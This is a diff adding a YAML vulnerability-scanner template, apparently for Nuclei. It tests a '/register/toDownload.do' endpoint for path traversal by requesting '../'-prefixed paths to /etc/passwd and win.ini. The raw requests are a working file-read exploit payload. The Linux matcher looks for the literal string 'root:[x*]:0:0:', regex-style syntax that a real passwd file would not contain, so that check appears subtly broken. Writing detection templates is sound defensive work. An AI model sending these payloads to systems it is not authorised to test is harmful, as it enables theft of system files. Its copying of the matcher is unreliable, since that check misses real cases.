@@ -1,0 +1,50 @@
+id: yaml-poc-hst-hst-readfile-ct-158007
+info:
+  name: File Read Vulnerability Detection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template identifies potential file read vulnerabilities by testing for the existence of sensitive files like `/etc/passwd` on Linux and `win.ini` on Windows.
+
+variables:
+  linux_file: '../../../../../../../../../../../../../../etc/passwd'
+  windows_file: '../../../../../../../../../../../../../../windows/win.ini'
+
+http:
+  - raw:
+      - |
+        GET /register/toDownload.do?fileName={{linux_file}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:[x*]:0:0:"
+      - type: word
+        part: header
+        words:
+          - "attachment;filename="
+
+  - raw:
+      - |
+        GET /register/toDownload.do?fileName={{windows_file}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "for 16-bit app support"
+          - "[extensions]"
+        condition: or
+      - type: word
+        part: header
+        words:
+          - "attachment;filename="
